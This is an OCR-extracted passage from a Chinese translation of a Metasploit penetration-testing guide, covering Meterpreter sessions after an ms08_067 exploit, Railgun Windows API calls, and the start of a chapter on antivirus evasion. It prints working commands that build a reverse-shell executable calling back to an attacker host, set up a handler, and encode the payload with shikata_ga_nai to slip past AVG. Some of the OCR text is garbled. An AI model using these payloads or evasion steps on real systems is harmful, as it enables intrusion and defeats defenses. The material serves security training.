[*]Started reverse handler on 192.168.33.129:8080
[*] Starting the payload handler...
[*] Command Stager progress - 3.16% done (1694/53587 bytes)
[*] Command Stager progress - 6.32% done (3388/53587 bytes)
·.SNIP..
[*]Command Stager progress - 97.99% done (52510/53587 bytes)
[*]Sending stage(748032 bytes)
msf exploit(ms08_067_netapi)>[*]Meterpreter session2opened(192.168.33.129:8080
192.168.33.130:1044)
msf exploit(ms08_067_netapi)>sessions-i2
[*]Starting interaction with 2...
meterpreter>
我们使用setg命令设置LHOST和LPORT参数O，这在使用sessions-u1命令?升级为
Meterpreter的时候是必需的。（setg命令将LPORT和LHOST参数设置为Metasploit的全局变
量，而不是局限在这一个模块之内。）
96
---
## Page 124
第6章Meterpreter
注意到在攻击系统的时候我们使用了exploit-z命令?，这个命令允许在成功攻击目标后暂
时不使用控制会话进行交互。如果这里使用的是exploit命令，可以简单地按CTRL-Z命令将
控制会话放到后台运行。
6.11通过附加的Railgun组件操作WindowsAPI
PatrickHVE编写的Metasploit附加组件一-Railgun，可以直接与Windows本地API进行
交互。将Railgun添加到Metasploit框架，你就可以通过Meterpreter调用WindowsAPI。举个例
子，在下面的代码中，我们由 Meterpreter进入到一个交互式的Ruby shell(irb)。irb shell允许使
用Ruby的语法与Meterpreter直接交互。这个例子中我们调用Railgun创建一个简单的“hello
world”的弹框。
meterpreter>irb
[*]StartingIRB shell
[*]The‘client'variableholds themeterpreterclient
>>client.railgun.user32.MessageBoxA(o,"hello","world","MB_Ok")
在WindowsXP目标系统上，可以看到弹出的窗口，标题栏上是“world"信息栏上是“hello”，
这个例子中，我们简单地输入参数便调用了user32.dll中的MessageBoxA函数。
提示：关于WindowsAPI的详细文档，可以访问http://msdn.microsoft.com
南手册：external/source/meterpreter/source/extensions/stdapi/server/railgun/），但你可以感觉到它
的强大功能。
言外之意是Railgun能为你提供与Win32本地应用程序一样访问WindowsAPI的能力。
6.12小结
行讲解，因为我们期望你能够在实际运用中掌握相关知识。Meterpreter是一个正在持续开发的
工具，有一大堆扩展脚本和附加工具的支持。当你充分了解它所有接口的时候，你也就能熟练
掌握其他新的东西了。第16章里，你将会学到如何从头开始来创建你自己的Meterpreter脚本，
并了解到Meterpreter脚本的整体结构是如何设计的。
97
---
## Page 125
PDG
---
## Page 126
第
章
免杀技术
进行渗透测试时，最尴尬的事莫过于被杀毒软件给检测出来，这也是一个很容易被忽视
的细节。如果没有事先做好计划进行免杀处理，那么你的目标很可能会被惊动，并发现攻击
的蛛丝马迹。在本章中，我们会列举一些需要注意杀毒软件的场合，并且讨论一些相应的解
决方案。
Y
大多数杀毒软件使用特征码（signatures）来识别恶意代码。这些特征码装载在杀毒引擎中，
用来对磁盘和进程进行扫描，并寻找匹配对象。发现匹配对象后，杀毒软件会有相应的处理流
程：大多数会将感染病毒的二进制文件隔离，或杀掉正在运行的进程。
你应该可以想象到，这种杀毒模型缺乏灵活性。首先，当前的恶意代码数量巨大，导致载
入了大量特征码的杀毒引擎很难对文件进行快速检查。其次，特征码必须足够特殊，应当仅在
---
## Page 127
Metasploit渗透测试指南
发现真正恶意程序时触发，而不会误杀合法软件。这种模型实现起来相对简单，但是实际应用
上并不是非常成功的。
话虽如此，杀毒软件厂商的钱也不是白赚的，这个行业有很多高智商的从业人员。如果你
没有对计划使用的攻击载荷进行定制，那么它很有可能被杀毒软件检测到。
它不会与杀毒软件的任何特征码匹配。此外，当进行直接的渗透攻击时，Metasploit的攻击载荷
可以仅仅在内存中运行，不将任何数据写入到硬盘上，这样我们发起攻击并上载攻击载荷后，
大多数杀毒软件都无法检测出它已在目标系统上运行。
在本章中我们的重点不是记住一些特定的命令，而是要掌握免杀处理方法的理念。我们要
弄清楚哪些操作可能会触发杀毒软件报警，并使用这里介绍的方法打乱代码次序，使它们不再
与杀毒软件的特征库匹配。掌握免杀技术，最为重要的是多多尝试和实验。
7.1使用MSF攻击载荷生成器创建可独立运行的二进制文件
在演示免杀技术之前，先让我们看看如何使用MSF攻击载荷生成器（msfpayload）创建一
个可独立运行的Metasploit载荷程序。作为初学者，我们先创建一个简单的反弹shell程序，它
能够回连到攻击机，并弹出一个命令行shell。这里我们使用msfpayload命令载入
windows/shell_reverse_tcp载荷。开始前，我们使用shell_reverse_tcp攻击载荷的O选项来查看
可用的参数，如·所示。
root@bt:/# msfpayload windows/shell_reverse_tcp 0 0
...SNIP..·
Basic options:
Name
Current Setting RequiredDescription
EXITFUNC process
yes
Exit technique:seh,thread，process
LHOST
yes
The local address
LPORT
4444
yes
The local port
现在我们再一次执行msfpayload命令，并附上生成WindowsPE文件（便携可执行文件）
所必需的各个参数。这里我们需要使用一个如·所示的X参数以指定输出文件的格式。
root@bt:/# msfpayload windows/shell_reverse_tcp LH0ST=192.168.1.101 LPORT=31337 X 0 >
/var/www/payload1.exe
root@bt:/#file/var/www/payload1.exe
var/www/payload1.exe: MS-D0S executable PE for MS Windows(GUI)Intel 80386 32-bit
听器。multi/handler模块允许Metasploit对反弹连接进行监听和处理。
100
---
## Page 128
第7章免杀技术
msf>useexploit/multi/handler0
msf exploit(handler)> show options @
..SNIP..
Payloadoptions(windows/meterpreter/reverse_tcp):
Name
Current Setting Required Description
EXITFUNC
process
yes
Exit technique: seh,thread, process
LHOST
192.168.1.101
yes
The local address
LPORT
4444
yes
The local port
SNIP
msf exploit(handler)>set PAYLoAD windows/shell_reverse_tcp③
PAYLOAD=>windows/shell_reverse_tcp
msf exploit(handler)>setLH0ST192.168.1.101①
LHOST => 192.168.1.101
msf exploit(handler)>set LPoRT 31337
LPORT =>31337
msf exploit(handler)>
我们载入了multi/handler模块O，并显示模块所需的各个参数?。然后设置攻击载荷为
Windows反弹shell③，以匹配我们先前创建的可执行文件，并指定模块监听的IP地址?，以及
监听端口。现在前期准备工作已完成。
7.2身
躲避杀毒软件的检测
在下面的例子中我们将使用广受欢迎的AVG杀毒软件作为兔杀对手。由于免杀处理的过程
需要不断地进行尝试，会耗费大量时间，所以我们在目标上实际部署攻击载荷之前，需要弄清
目标的反病毒方案，以确保我们的攻击载荷能够顺利运行。
在本例中，当我们使用AVG对生成的攻击载荷文件进行检测时，AVG报告发现了病毒，
如图7-1所示。
FileComponentsHistoryToolsHelp
AVG
You are protected.
Anti-Virus
Allsecurity featuresare
Free Edition
Scanresults
Results overviewInfections
File
Infectio
CADo
Virusfoundwin32/Heur
Shel
图7-1AVG检测出我们的攻击载荷文件包含恶意代码
101
---
## Page 129
Metasploit渗透测试指南
7.2.1使用MSF编码器
避免被查杀的最佳方法之一是使用MSF编码器（msfencode）对我们的攻击载荷文件进行
重新编码。MSF编码器是一个非常实用的工具，它能够改变可执行文件中的代码形状，让杀毒
软件认不出它原来的样子，而程序功能不会受到任何影响。和电子邮件附件使用Base64重新编
码类似，MSF编码器将原始的可执行程序重新编码，并生成一个新的二进制文件。当这个文件
运行后，MSF编码器会将原始程序解码到内存中并执行。
可以使用msfencode-h命令查看MSF编码器的各种参数，它们当中最为重要的是与编码
格式有关的参数。如下面例子所示，我们可以使用msfencode-1列出所有可用的编码格式。请
注意不同的编码格式适用于不同的操作系统平台。由于架构不同，一个PowerPC（PPC）编码
器生成的文件在x86平台上显然无法正常工作。
root@bt:/opt/framework3/msf3#msfencode-1
Framework Encoders
Name
Rank
Description
= =
cmd/generic_sh
good
GenericShellVariableSubstitutionCommandEncoder
cmd/ifs
1ow
Generic${IFS}Substitution CommandEncoder
generic/none
normal
The "none"Encoder
mipsbe/longxor
XOR Encoder
mipsle/longxor
normal
XOR Encoder
php/base64
normal
PHP Base64 encoder
ppc/longxor
normal
PPC LongXOR Encoder
ppc/longxor_tag
normal
PPC LongXOR Encoder
sparc/longxor_tag
normal
SPARC DWORD XOR Encoder
x64/xor
normal
XOR Encoder
x86/alpha_mixed
1ow
Alpha2 Alphanumeric Mixedcase Encoder
x86/alpha_upper
1ow
Alpha2 Alphanumeric Uppercase Encoder
x86/avoid_utf8_tolower
manual.
Avoid UTF8/tolower
x86/ca114_dword_xor
teou
Call+4 Dword xOR Encoder
x86/countdown
Single-bytexOR Countdown Encoder
x86/fnstenv_mov
Variable-lengthFnstenv/movDwordxoR Encoder
x86/jmp_call_additive
Jump/CallxORAdditiveFeedbackEncoder
x86/nonalpha
1ow
Non-Alpha Encoder
x86/nonupper
low
Non-Upper Encoder
x86/shikata_ga_nai
excellent
Polymorphic XOR Additive Feedback Encoder
x86/single_static_bit
manual
Single Static Bit
x86/unicode_mixed
manual
Alpha2AlphanumericUnicode Mixedcase Encoder
x86/unicode_upper
manual
Alpha2 Alphanumeric Unicode Uppercase Encoder
102
---
## Page 130
第7章免杀技术
现在演示如何对MSF攻击载荷进行编码，我们将msfpayload生成的原始数据输入
msfencode中，并查看生成的可执行文件还会不会被杀毒软件检测到。
root@bt:/# msfpayload windows/shell_reverse_tcp LH0ST=192.168.1.101 LPORT=31337 R 0|
msfencode-ex86/shikata_ga_nai-texe③>/var/www/payload2.exe
[*]x86/shikata_ga_nai succeeded with size 342 (iteration=1)
root@bt:/#file/var/www/payload2.exe@
/var/www/2.exe:MS-D0S executable PE for MS Windows (GUI) Intel 80386 32-bit
我们在msfpayload命令后面添加R标志·告诉它输出原始数据，因为我们需要把原始数据
直接通过管道输入msfencode命令中。指定使用x86/shikata_ga_nai编码器?，并告诉MSF编